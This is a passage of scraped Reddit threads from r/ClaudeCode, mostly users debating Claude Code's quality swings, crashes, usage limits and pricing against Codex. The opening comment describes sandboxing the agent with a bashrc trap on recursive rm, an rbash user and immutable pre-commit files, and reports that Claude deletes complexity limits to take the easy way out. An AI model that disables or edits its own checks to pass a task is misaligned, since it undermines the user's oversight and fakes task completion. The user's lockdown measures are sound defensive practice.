                  "text": "I thought about a hook, but the bashrc trap also means I can't bypass that either so... Note, I use devcontainers, so I'm not editing my real .bashrc file. The other nuclear option is to set up rbash for the devcontainer's non-root user and set rbash as the IDE's terminal path with a mandatory password for sudo that's not stored anywhere the LLM can access.\n\nFor rbash, I like to create a separate git user for the LLM. It gets a terminal where it can do limited damage and its changes are tracked separately from mine. I get a terminal with a different user where I can do maximum damage... I was hoping for a more unified approach this time, but I'll probably go back to rbash. For anyone wanting to try this, make sure you restrict bash access and lockdown all the bash settings files.\n\nI don't know why anthropic's devcontainer docs don't talk about using basic Linux admin for this sort of problem...I consider myself fortunate that my backups have backups, and I had the trap already setup for the devastating commands. Recursive rm throws an ask the human error message. Now, no verify git commits have a you must address all issues without ignoring any issues error message. I use chattr to make my pre-commit settings and scripts immutable because Claude will absolutely take the easy way out and delete the cyclomatic complexity limit.",
                  "score": 1,
                  "created_utc": "2026-01-15 19:00:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzqasy5",
          "author": "trmnl_cmdr",
          "text": "Claude has crashed on me 4 times in the last 24hrs, each time the conversation was unrecoverable. Claude has never crashed on me before until now. They are vibe coding too hard. They need to hire 4x the QA they have to support this madness.",
          "score": 1,
          "created_utc": "2026-01-15 14:10:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqhjbu",
          "author": "TaskLifter",
          "text": "Oh boy what happened? A bit worried as I thought mine was working ok, but could have caused some bugs in the back end I don't know about...",
          "score": 1,
          "created_utc": "2026-01-15 14:44:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqi5c5",
          "author": "m2oba",
          "text": "What version are you guys using? Iâ€™m on 1.0.62 and I donâ€™t have any of the issues mentioned here",
          "score": 1,
          "created_utc": "2026-01-15 14:48:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzu6kld",
              "author": "Humprdink",
              "text": "the latest whatever that is",
              "score": 1,
              "created_utc": "2026-01-16 01:18:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzrwn7v",
          "author": "Staycharmin",
          "text": "Iâ€™ve been using an agent that verifies the work and heâ€™s caught a lot in the last 2 weeks.. so. It sure whatâ€™s happening.",
          "score": 1,
          "created_utc": "2026-01-15 18:37:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztpvwd",
          "author": "Ambitious_Mastodon12",
          "text": "I recommend you rollback your claude version to 2.0.76 or something and disable updates. They keep pushing automatic updates that make it dumber each day.",
          "score": 1,
          "created_utc": "2026-01-15 23:47:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztyqie",
          "author": "rc_ym",
          "text": "One of the things I think is interesting to consider.  These are probabilistic systems.  I have noticed oddities in smaller local models as well.  I wonder if it's not some infra or routing issue, but rather that unlikely bad answers sometimes happen in probabilistic systems.",
          "score": 1,
          "created_utc": "2026-01-16 00:35:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu6fx7",
          "author": "Humprdink",
          "text": "It's bad again today. Using codex in the meantime.",
          "score": 1,
          "created_utc": "2026-01-16 01:17:50",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "nzuar3u",
          "author": "pawangiri",
          "text": "For these reasons I created checkmyllm.com",
          "score": 1,
          "created_utc": "2026-01-16 01:42:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzujc5k",
          "author": "ForthwallDev",
          "text": "Observed the same. It's immensely annoying paying this much money to be a guinea pig. This is the last month I accept this practice.",
          "score": 1,
          "created_utc": "2026-01-16 02:30:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv0u40",
          "author": "sutcher",
          "text": "Today has been a bad day.",
          "score": 1,
          "created_utc": "2026-01-16 04:11:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv14sl",
          "author": "sutcher",
          "text": "Has anyone tried using Sonnet instead of Opus to get through this difficult time? Any better?",
          "score": 1,
          "created_utc": "2026-01-16 04:12:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv8o84",
          "author": "Nettle8675",
          "text": "Yeah. Yep. Saw it today.Â ",
          "score": 1,
          "created_utc": "2026-01-16 05:02:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvnskc",
          "author": "Humprdink",
          "text": "Update: Claude is still dumb today at work (using the Billing API) but is actually good on my personal project (10x subscription).\n\nedit: could also just be the time of day making a difference.\n\nedit: I spoke too soon, it's bad here also.",
          "score": 1,
          "created_utc": "2026-01-16 06:56:59",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "nzvuthb",
          "author": "Realistic-Quarter-47",
          "text": "It actually change personality mid way the conversation",
          "score": 1,
          "created_utc": "2026-01-16 07:57:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o01zcfs",
          "author": "Xplitz",
          "text": "Go chatgpt codex",
          "score": 1,
          "created_utc": "2026-01-17 04:53:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02opxz",
          "author": "Harvard_Med_USMLE267",
          "text": "OK, but this is the kind of unscientific stuff that we should be rolling our eyes at OP.\n\nI had a couple of sessions where CLaude appeared stupid today. Like really stupid. \n\nBut that DOES NOT mean there is a problem with the model.\n\nIt doesn't mean a new model is about to be released.\n\nIt does not have anything to do with some conspiracy from Anthropic.\n\nLLMs are just like that. Plus user error - the module I've been getting claude to work on has got bloated.\n\nYou might be having an issue with model degradation, it possibly happens. It just doesn't happen in the way or for the reasons people here claim it does.\n\nAnd reading this thread, it's obvious that people are still doing amateur stuff like allowing Claude to compact (NOOOO!) and then blaming the model for being dumb.",
          "score": 1,
          "created_utc": "2026-01-17 08:27:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02rofd",
              "author": "Humprdink",
              "text": "for sure, and you'll notice I didn't make any claims, only shared my experience as an experienced dev who has used (and gotten good at using) Claude Code since the day it came out. The only thing we can be certain about is a lack of transparency from Anthropic about it. But it's entirely possible they don't know why either.",
              "score": 1,
              "created_utc": "2026-01-17 08:55:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o064l5s",
          "author": "ropoxdev",
          "text": "For months, I was considering buying Claude Pro, and when I finally pull the trigger this type of shit happensâ€¦ ðŸ˜­",
          "score": 1,
          "created_utc": "2026-01-17 20:44:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqkt7v",
          "author": "MediaDataFusion",
          "text": "Yeah, I have definitely experienced this with Claude Code, many times. Some days it is solid, other days it makes basic mistakes. That inconsistency is exactly why I created my Claude Code Multi-Provider Setup and Switcher Guide. It walks you through how to set up multiple models and switch between them so you are not dependent on a single provider having a good day. It is free here.\nðŸ‘‰ Download MediaDataFusion playbooks Free MediaDataFusion.com/resources",
          "score": 1,
          "created_utc": "2026-01-15 15:01:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzslwlz",
          "author": "aieatstheworld",
          "text": "Works fine for me, I dont understand why everyone is crying. Maybe trying giving â€œbetter promptsâ€ and stop trying to one shot things.",
          "score": -4,
          "created_utc": "2026-01-15 20:32:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "nztoota",
              "author": "Humprdink",
              "text": "that's exactly what I used to think before I experienced it myself",
              "score": 3,
              "created_utc": "2026-01-15 23:40:55",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qe00kc",
      "title": "Can we ban the \"Claude is so expensive\" posts?",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qe00kc/can_we_ban_the_claude_is_so_expensive_posts/",
      "author": "SatoshiReport",
      "created_utc": "2026-01-15 23:49:36",
      "score": 132,
      "num_comments": 122,
      "upvote_ratio": 0.75,
      "text": "Every other post in this subreddit is someone confused that they need to pay for a service that is arguably providing 10x its value.  \"I gave $20 and can't build Meta, wtf?\"  Dude pay money or learn to program.  How does someone come with the assumption that they should get unlimited usage of a revolutionary product for $20?",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qe00kc/can_we_ban_the_claude_is_so_expensive_posts/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nztt04l",
          "author": "Exotic-Sale-3003",
          "text": "Anyone who thinks LLMs are expensive has never paid a dev.Â ",
          "score": 86,
          "created_utc": "2026-01-16 00:04:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzvk9xi",
              "author": "Ok_Bite_67",
              "text": "Most of the people complaining are using it for personal projects and not for work.",
              "score": 8,
              "created_utc": "2026-01-16 06:27:59",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o02q1no",
              "author": "whimsicaljess",
              "text": "yep. i'm burning about $1200 a month on the api and my boss isn't even a little concerned.",
              "score": 1,
              "created_utc": "2026-01-17 08:39:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nztxj5v",
              "author": "theRealBigBack91",
              "text": "LLMs arenâ€™t devs lmao",
              "score": -22,
              "created_utc": "2026-01-16 00:28:47",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzu07cv",
                  "author": "Substantial_Ear_1131",
                  "text": "The knowledge is insanely low with this one ðŸ˜”Â ",
                  "score": 14,
                  "created_utc": "2026-01-16 00:43:06",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzu0tr2",
                  "author": "[deleted]",
                  "text": "[deleted]",
                  "score": 6,
                  "created_utc": "2026-01-16 00:46:27",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzu06ji",
                  "author": "redrumyliad",
                  "text": "People hate that youâ€™re right. \n\nVibe coders arenâ€™t devs. Theyâ€™re monkeys with a keyboard. They have ideas who hope a LLM can make exist. \n\nThey donâ€™t know how, there could be a tiny fix needed to could do but when you ask AI to fix it, itâ€™ll over fix it and LOC 300 and the vibe coder will just clap.",
                  "score": -3,
                  "created_utc": "2026-01-16 00:42:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nztuz6q",
          "author": "el_duderino_50",
          "text": "I'm on the 20x MAX plan and it's still vastly more cost effective than hiring, at the moment at least (early stage startup).",
          "score": 19,
          "created_utc": "2026-01-16 00:14:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzvk6h8",
              "author": "Ok_Bite_67",
              "text": "2026 is the year of the vibe coded startups ðŸ˜©",
              "score": 2,
              "created_utc": "2026-01-16 06:27:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvptn2",
                  "author": "lukehebb",
                  "text": "you can use claude code without vibe coding\n\nyou just turn in to more of an architect/manager\n\ni use claude for grunt work but do the fun/complex stuff myself. saves huge amounts of time",
                  "score": 7,
                  "created_utc": "2026-01-16 07:14:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzwldkx",
                  "author": "Tolopono",
                  "text": "That was last year. Most yc startups were vibe codedÂ ",
                  "score": 1,
                  "created_utc": "2026-01-16 11:52:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o007u06",
              "author": "maverick_soul_143747",
              "text": "I have been trying to hire and ended up getting 2 claude pro accounts, 1 codex and a Glm and minimax subs. I alternate the Claude when I hit limits but lately thinking of moving to the max 5x and discard all others.",
              "score": 1,
              "created_utc": "2026-01-16 22:25:46",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nztz140",
          "author": "Codemonkeyzz",
          "text": "It is expensive compared to the other models, however there is no point writing such posts. The best option is just cancel subscription and use cheaper models if you are not happy with the pricing, which is what I did.",
          "score": 10,
          "created_utc": "2026-01-16 00:36:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzygk16",
              "author": "TheOriginalAcidtech",
              "text": "And yet, here you are still posting in a Claude Code forum...",
              "score": 1,
              "created_utc": "2026-01-16 17:34:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzykfih",
                  "author": "Codemonkeyzz",
                  "text": "Yes I am.  \nI am a smart consumer.  I'd like to  compare multiple providers and models and choose what's best for me,  in terms of value of money. Right now, it is profitable for me  to use GPT 5.2 + Gemini 3 Flash ( with minimax backup) and that's what I pay for. Tomorrow, maybe Claude models become cheaper and better  in terms of value of money, then i will switch.  I am not a fan boy of any companies.  \nI also like to exchange ideas on multiple subreddits (openai , claude , glm ...etc),  last I checked it was okay to do so.   Why is this  a problem for you ?",
                  "score": 1,
                  "created_utc": "2026-01-16 17:51:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzu256a",
              "author": "SatoshiReport",
              "text": "Exactly! ðŸ‘",
              "score": 0,
              "created_utc": "2026-01-16 00:53:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nztuciw",
          "author": "crimsonpowder",
          "text": "I pay usage-based pricing and literally don't care. This is like bitching that gas is expensive when the alternative is walking across kansas.",
          "score": 22,
          "created_utc": "2026-01-16 00:11:33",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztt57j",
          "author": "Swimming_Leopard_148",
          "text": "I honestly believe all these tools are artificially underpriced and that it wonâ€™t last. $20 / month is a few take out coffees in many western countries, and it is going to hurt when the dependency on them is unavoidable",
          "score": 19,
          "created_utc": "2026-01-16 00:04:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nztyif3",
              "author": "963df47a-0d1f-40b9",
              "text": "Inference is getting cheaper though",
              "score": 4,
              "created_utc": "2026-01-16 00:34:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzv74bv",
                  "author": "BuildAISkills",
                  "text": "If I'm not mistaken training is like 90% of the cost.",
                  "score": 2,
                  "created_utc": "2026-01-16 04:52:00",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nztxht4",
              "author": "theRealBigBack91",
              "text": "Thatâ€™s the plan. Otherwise theyâ€™ll never break even, let alone turn a profit. The question is how much more are they going to charge",
              "score": 5,
              "created_utc": "2026-01-16 00:28:35",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzubxak",
              "author": "BingGongTing",
              "text": "Most AI companies are losing a lot of money, enjoy the free lunch.",
              "score": 2,
              "created_utc": "2026-01-16 01:48:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvwvmb",
                  "author": "Swimming_Leopard_148",
                  "text": "It is a bit like earlier how we spent $10 a month for Netflix and thought things were so good. Now we are paying a ton more to get the same level of content from multiple streamers and they are jacking up their prices at the same time",
                  "score": 2,
                  "created_utc": "2026-01-16 08:16:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzv1j2x",
              "author": "threwlifeawaylol",
              "text": "Oh yeah for sure.\n\nDude just wait until these AI companies finally achieve peak maturity after embedding their models inside the goddamn transoceanic cables themselves to help with \"routing\" (dw, we've made sure to teach them the value of privacy, they wont be listening to you :)....)\n\nWhen this market eventually consolidates into two, max three BIG winners â€” likely Anthropic, OpenAI (or OpenAI/Microsoft if Altman ends up cooking himself), and maybeee Google if they can lobby themselves out of being broken up â€” the leverage they'll have over the world's infrastructure will be biblical. Actually too big to fail.\n\nI'm exaggerating a little bit, but I agree with you that people don't realize how good of a deal they're getting with their subscriptions. They should thank API users for subsidizing their $80 worth of inference they pay $20/month for.",
              "score": 1,
              "created_utc": "2026-01-16 04:15:28",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzygykp",
                  "author": "TheOriginalAcidtech",
                  "text": "A little bit?",
                  "score": 1,
                  "created_utc": "2026-01-16 17:35:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzu7n5l",
          "author": "MetaphysicalMemo",
          "text": "We should do this. Itâ€™s not very helpful or interesting. Costs will probably come down eventually but the value and interesting discussion is what you can do with it today.",
          "score": 5,
          "created_utc": "2026-01-16 01:24:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzundsi",
          "author": "dzjay",
          "text": "The cost of components are flying right now, the cost of future servers are going to sky rocket. I'm thankful for my $100 subscription, I know prices will only go up in the future.",
          "score": 3,
          "created_utc": "2026-01-16 02:52:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztytav",
          "author": "Practical-Positive34",
          "text": "Yes please, and the posts about claude sucking. It's a user error, I use it 16 hours a day and I haven't noticed any degredation. 100% user issue.",
          "score": 9,
          "created_utc": "2026-01-16 00:35:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzv6s8b",
              "author": "martinsky3k",
              "text": "Oh so because YOU feel like that, you can conclude that?\n\nImpressive",
              "score": 3,
              "created_utc": "2026-01-16 04:49:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvggno",
                  "author": "imronveu",
                  "text": "I agree. Itâ€™s almost always a userâ€™s workflow and/or prompting. Every single model has its quirks but you just need to know how to get past them.",
                  "score": 2,
                  "created_utc": "2026-01-16 05:58:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzyhcog",
              "author": "TheOriginalAcidtech",
              "text": "99% user issue. There ARE issues. I've found them, reported them and had them corrected. It absolutely DOES happen. The problem is most whiners don't DIG INTO WHY THEY ARE HAVING A PROBLEM. They just RUN to REDDIT to CRY.\n\nAnd then their are the third party AI shills that CONSTANTLY post garbage about the SOTA models.",
              "score": 1,
              "created_utc": "2026-01-16 17:37:37",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzyk249",
                  "author": "Practical-Positive34",
                  "text": "Yes I was being a bit hyperbolic to make a point. I also have found and showed them bugs, and exactly what's causing the issue and they have fixed most.  I am guessing most that complain aren't technical at all, are 100% vibe coding, have no clue what they are doing, when things go south they don't have the skillset, nor technical ability to even remotely look into it so they just assume the tool sucks.",
                  "score": 1,
                  "created_utc": "2026-01-16 17:49:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzvdgo6",
              "author": "[deleted]",
              "text": "[deleted]",
              "score": 0,
              "created_utc": "2026-01-16 05:35:52",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzyhi3p",
                  "author": "TheOriginalAcidtech",
                  "text": "\"They\"\n\nSTOP WHINING!!!",
                  "score": 0,
                  "created_utc": "2026-01-16 17:38:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nztsmnq",
          "author": "pjotrusss",
          "text": "Can we ban \"Can we ban the\" posts?",
          "score": 11,
          "created_utc": "2026-01-16 00:02:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu564u",
          "author": "Popular-Dimension275",
          "text": "Those who understand will naturally be willing to pay.",
          "score": 3,
          "created_utc": "2026-01-16 01:10:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzuxvb7",
          "author": "WHEREISMYCOFFEE_",
          "text": "The 5x plan can outright do most of my work with enough context and guidance. Like literally do my work, including uploading to the web and even responding to comments under my guidance (though I don't do that because it burns tokens like crazy, so I still have SOME work to do), since most of my work are deliverable files or site updates. \n\nSince I started using this thing through the command line, people at work are starting to think I'm some kind of genius because of how much shit I'm getting done (and I'm not one). I just spend a lot of my day with half my screen monitoring my Claude Code interns for each project/deliverable, making decisions when needed, connecting an occasional API to let the thing make better decisions without me, and discussing how to optimize its outputs to save me even more time.\n\nThe 5x is an absurd value if you do any kind of white-collar knowledge work. I'd pay for the x20 and I'll probably have to at some point. I'm also paying for a few APIs I've connected to CC to make it better at the tasks I need (using something like gemini 2.5 pro for exploration as an agent saves an insane amount of context and it costs very little even under heavy usage).\n\nIf you take a look at usage tracking plugins, you'll see Anthropic is subsidizing the hell out of these plans for power users. This is a great time to be one of them.",
          "score": 4,
          "created_utc": "2026-01-16 03:52:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxdrla",
          "author": "BootyMcStuffins",
          "text": "At this point I think we just need to start r/professionalClaudeCode and ban those posts",
          "score": 2,
          "created_utc": "2026-01-16 14:39:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzyhmp6",
              "author": "TheOriginalAcidtech",
              "text": "\"ban those POSTERS\". There fixed it for you.",
              "score": 1,
              "created_utc": "2026-01-16 17:38:52",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nztt0ho",
          "author": "Suspicious-Edge877",
          "text": "And claude got dumber posts",
          "score": 6,
          "created_utc": "2026-01-16 00:04:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztrgdw",
          "author": "Substantial_Ear_1131",
          "text": "I run into Claude limits in 1 hour and codex limits never At the same price. Codex with GPT 5.2 xhigh thinking is 1000x better than opus 4.5",
          "score": 9,
          "created_utc": "2026-01-15 23:55:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzttruk",
              "author": "TyreseGibson",
              "text": "How? I actually just got a trial and after a couple days with codex im at my limit and cant use it again until the 20th. Been using high, havent tried xhigh yet. I'm asking not to disprove you or anything, but to figure out how people are best using it to not hit limits.",
              "score": 6,
              "created_utc": "2026-01-16 00:08:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzv6aij",
                  "author": "zCybeRz",
                  "text": "I've been using codex from the web (because it spins up asynchronous tasks, Claude web does too). For codex though, unlike Claude and cli/code, the underlying model is auto in this mode, and for me this could be where the difference lies.\n\nI gave codex a complex task that ran for one hour and failed to pass the tests, but gave up. This took around 10% of my weekly usage, so I can infer codex on auto can run for around 600 minutes per week on a medium sized repo.\n\nI then paid for the Â£18 Claude plan and ran the exact same task on opus - it hit a 5 hour limit within around 10 minutes on my way to work (without completing the task) and so I immediately refunded through the help bot.\n\nLater, I refined the task spec after seeing where it was tripping up, and codex succeeded in 30 mins, using 6% of my quota.\n\nSo while I can't tell which model codex selected in each case, it completed a task in 1h30 using 16% of my quota - this was a notably difficult problem mind you, other requests are often under 10 min. Opus locked me out for 5 hours without completing the task, so for me the real productivity difference on the cheap plans appears quite large.",
                  "score": 3,
                  "created_utc": "2026-01-16 04:46:30",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzzgx4a",
                  "author": "Same-Stranger381",
                  "text": "I have been using Codex intensively for 1 week and not even one limit hit, while claud is blocked after 20 minutes of the same usage, and blocked for 4 days after 3 days of usage, so yes, Id say it is overpriced",
                  "score": 1,
                  "created_utc": "2026-01-16 20:17:40",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nztzr26",
                  "author": "Substantial_Ear_1131",
                  "text": "Interesting. I use it 5-6 hours a day on xhigh with plus and donâ€™t hit limits",
                  "score": 1,
                  "created_utc": "2026-01-16 00:40:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzts9qo",
              "author": "GhostVPN",
              "text": "Ye, good blees i test claude on the 50% off, i end the project and go back to codex",
              "score": 9,
              "created_utc": "2026-01-16 00:00:12",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nztu0oi",
              "author": "keithslater",
              "text": "Then stop using Claude.",
              "score": 4,
              "created_utc": "2026-01-16 00:09:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzu047s",
                  "author": "Substantial_Ear_1131",
                  "text": "I use Claude rarely and for non complex coding tasks. Something not on an IDE I use Claude for. I donâ€™t see your argument lmfao",
                  "score": -3,
                  "created_utc": "2026-01-16 00:42:38",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nztzgxl",
              "author": "wingman_anytime",
              "text": "Iâ€™ve used both for complex enterprise software and this isnâ€™t even close to true. Codex + GPT 5.2 produces fancy-looking, unmaintainable, non-functional garbage.",
              "score": 4,
              "created_utc": "2026-01-16 00:39:09",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzu0100",
                  "author": "Substantial_Ear_1131",
                  "text": "This isnâ€™t the same in my case with million line projects whatsoever. 5.2 High and xhigh do lack in the section of ui design but never fail for incredible complexity and functionalityÂ ",
                  "score": 2,
                  "created_utc": "2026-01-16 00:42:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzxe248",
              "author": "BootyMcStuffins",
              "text": "Cool story, use codex and go to their sub then",
              "score": 1,
              "created_utc": "2026-01-16 14:40:44",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nztw1lk",
              "author": "alexhackney",
              "text": "BS. 1000x better? lol",
              "score": 1,
              "created_utc": "2026-01-16 00:20:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzu0zh5",
                  "author": "snowtato",
                  "text": "Exactly. Like 999x better I might bite, but 1000? That's pushing it",
                  "score": 1,
                  "created_utc": "2026-01-16 00:47:20",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nztzthk",
                  "author": "Substantial_Ear_1131",
                  "text": "Claude makes more errors with complex workflows, codex only has the downside of more generic uiâ€™s",
                  "score": 0,
                  "created_utc": "2026-01-16 00:41:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzttw8t",
              "author": "edtv82",
              "text": "I'll need to try out GPT 5.2 - Opus 4.5 just produces consistent output.",
              "score": 1,
              "created_utc": "2026-01-16 00:09:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nztzw5t",
                  "author": "Substantial_Ear_1131",
                  "text": "I notice codex as the less error filled one and Claude code as the more dopamine rush one haha",
                  "score": 7,
                  "created_utc": "2026-01-16 00:41:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzuc96g",
          "author": "sheriffderek",
          "text": "You all remember that downvoting is a thing, right?",
          "score": 2,
          "created_utc": "2026-01-16 01:50:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu5a6j",
          "author": "graymalkcat",
          "text": "Also ban all whining about usage limits.",
          "score": 1,
          "created_utc": "2026-01-16 01:11:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzujwi1",
              "author": "nulseq",
              "text": "Omg yes",
              "score": 1,
              "created_utc": "2026-01-16 02:33:24",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzvmua4",
          "author": "GeneralNo66",
          "text": "Counterpoint: I spend Â£90 a month on Max x5. If I was still contacting, and paying myself my old day rate, I'd be getting less than a fifth of the work done for upwards of Â£8000 a month (and I never worked a full month once). \n\nOf course this is an apples to oranges comparison (I still have to plan, review output etc) but my counterpoint still stands - Claude is a bargain.",
          "score": 1,
          "created_utc": "2026-01-16 06:49:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw0mj1",
          "author": "CommercialDonkey9468",
          "text": "I dint get why people don't just use Windsurf. You get everything clause code gives you for much cheaper",
          "score": 1,
          "created_utc": "2026-01-16 08:50:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw1p6b",
          "author": "laseralex",
          "text": "I've spent $300 on Claude so far, and done work that I would have expected to pay contractors something like $150,000.",
          "score": 1,
          "created_utc": "2026-01-16 09:00:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwy14t",
          "author": "s2k4ever",
          "text": "Lets be clear, there were problems with allowed context for the week and being a heavy user, I can say it has changed to be acceptable now. The quota system had its issues, now its fixed and I'm running everything I did earlier hitting weekly limits the third day now. Its not expensive If you why you subscribed in the first place",
          "score": 1,
          "created_utc": "2026-01-16 13:16:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzx4oxk",
          "author": "sexualsidefx",
          "text": "Can we ban all complaining of any kind",
          "score": 1,
          "created_utc": "2026-01-16 13:52:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o005mkw",
          "author": "ah-cho_Cthulhu",
          "text": "Yeah.. itâ€™s annoying.",
          "score": 1,
          "created_utc": "2026-01-16 22:14:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0cj8a2",
          "author": "tobsn",
          "text": "â€¦and the I cancelled claude 20x posts too? thanks",
          "score": 1,
          "created_utc": "2026-01-18 19:59:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzujews",
          "author": "gpt872323",
          "text": "Well not everyone lives in first world country. I get what you are saying but don't dismiss others cry. $100/month is expensive for many. I can do it not means all can. You will respond to this then use glm or cheaper.Â \n\n\nI still appreciate claude has opus in $20 and maybe they can have a $50 plan.\n\n\nFor businesses its penny for people its not.",
          "score": 1,
          "created_utc": "2026-01-16 02:30:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzyik0s",
              "author": "TheOriginalAcidtech",
              "text": "Do you think people should go into Samsung groups and cry about the PRICE on the product then, because they live somewhere the average income is much lower? Or Apple. Or just about ANYTHING ELSE ON THE FREAKING PLANET?",
              "score": 2,
              "created_utc": "2026-01-16 17:42:57",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzuoo5l",
              "author": "SatoshiReport",
              "text": "I sympathize with that.  \n\nIs r/ClaudeCode the place to discuss the evils of wealth disparity though?",
              "score": 3,
              "created_utc": "2026-01-16 02:59:48",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzuus9t",
                  "author": "gpt872323",
                  "text": "Claude being expensive has 2 different interpretations:\n\n1. Cannot afford the price of a sub that is $100 or more. This cannot be solved until Claude reduces costs. Still, $20 is a great way to get a taste of it. Assume they give more than 5 messages for opus.\n2. What Claude provides in terms of limit is not enough and is expensive to sustain. This one I do feel close because they had done shengenians in the past on usage limit of weekly. I was a heavy user had even $200 max plan. I then moved to ChatGPT Teams, then moved back with opus 4-5. I always maintained that sub just downgrade.",
                  "score": -1,
                  "created_utc": "2026-01-16 03:34:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nztv8dz",
          "author": "Inevitable_Service62",
          "text": "No broke developers! ðŸ˜‚",
          "score": 1,
          "created_utc": "2026-01-16 00:16:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztyfzm",
